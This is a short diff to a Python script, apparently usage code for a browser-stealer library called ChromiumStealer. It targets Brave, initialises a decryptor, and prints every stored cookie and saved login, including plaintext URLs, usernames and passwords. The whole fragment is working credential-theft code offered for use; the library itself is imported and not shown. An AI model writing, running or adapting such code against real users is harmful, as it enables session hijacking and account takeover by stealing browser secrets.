@@ -4,11 +4,19 @@
 from ChromiumStealer import ChromiumStealer
 from ChromiumStealer import Browsers
 
-stealer = ChromiumStealer(browser)
+def main():
+    stealer = ChromiumStealer(Browsers.Brave)
+    if not stealer.exists():
+        print(f'Browser does not exist.')
+    else:
+        stealer.initialize_crypter()
 
-for host, cookie_name, cookie_value, encrypted_cookie_value in stealer.cookies():
-    print(host, cookie_name, cookie_value, encrypted_cookie_value)
+        for cookie in stealer.cookies():
+            print(cookie['host'], cookie['name'], cookie['value'])
 
-for url, username, password in stealer.logins():
-    print(url, username, password)
+        for login in stealer.logins():
+            print(login['url'], login['login'], login['password'])
+
+if __name__ == '__main__':
+    main()
 ```
